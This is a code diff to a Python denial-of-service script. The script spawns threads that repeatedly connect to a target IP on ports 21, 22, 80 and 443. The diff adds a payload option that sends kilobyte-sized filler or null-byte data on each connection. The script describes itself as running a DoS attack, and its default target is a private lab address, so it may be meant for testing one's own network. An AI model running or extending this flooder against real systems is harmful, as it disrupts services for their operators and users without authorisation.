@@ -3,6 +3,8 @@ import time
 import random
 import argparse
 import threading
+import math
+import os
 from scapy.all import IP, TCP, Raw, send, RandShort
 
 """
@@ -12,24 +14,39 @@ Currently attempts to connnect continuously and sends a small data packet.
 
 class DoS:
     # Initializes target ip, ports, mode, requests per second and concurrency
-    def __init__(self, target_ip, ports, mode, requestsPerSecond, concurrency):
+    def __init__(self, target_ip, ports, requestsPerSecond, concurrency, payload="test"):
         self.target_ip = target_ip
         self.ports = ports
-        self.mode = mode
         self.requestsPerSecond = requestsPerSecond
         self.concurrency = concurrency
+        self.payload = payload
         self.stop = threading.Event()
 
 
     # Attempts to connect
     def connect(self, port):
-
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(2)
             s.connect((self.target_ip, port))
             try:
-                s.send(b'X')
+                if self.payload == "test":
+                    payload = b'ABCD' * 512
+                    try:
+                        s.sendall(payload)
+                    except Exception:
+                        pass
+                elif self.payload == "binary":
+                    payload = b'\x00' * 128
+                    try:
+                        s.sendall(payload[:512])
+                    except Exception:
+                        pass
+                else:
+                    try:
+                        s.send(b'X')
+                    except Exception:
+                        pass
             except Exception:
                 pass
             s.close()
@@ -59,7 +76,7 @@ class DoS:
 
     # Runs the DoS attack
     def run(self, duration):
-        print(f"mode={self.mode} target={self.target_ip} ports={self.ports} requestsPerSecond={self.requestsPerSecond} concurrency={self.concurrency} duration={duration}s")
+        print(f"target={self.target_ip} ports={self.ports} requestsPerSecond={self.requestsPerSecond} concurrency={self.concurrency} duration={duration}s")
         threads = []
 
         for _ in range(self.concurrency):
@@ -89,12 +106,12 @@ def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--target", default="192.168.1.65")
     ap.add_argument("--ports", default="21,22,80,443")
-    ap.add_argument("--mode", choices=["connection"], default="connection")
     ap.add_argument("--requestsPerSecond", type=float, default=10.0)
     ap.add_argument("--concurrency", type=int, default=10)
     ap.add_argument("--duration", type=int, default=15)
+    ap.add_argument("--payload", choices=["test","binary"], default="test")
     args = ap.parse_args()
-    dos = DoS(args.target, parse_ports(args.ports), args.mode, args.requestsPerSecond, args.concurrency)
+    dos = DoS(args.target, parse_ports(args.ports), args.requestsPerSecond, args.concurrency, args.payload)
     dos.run(args.duration)
 
 
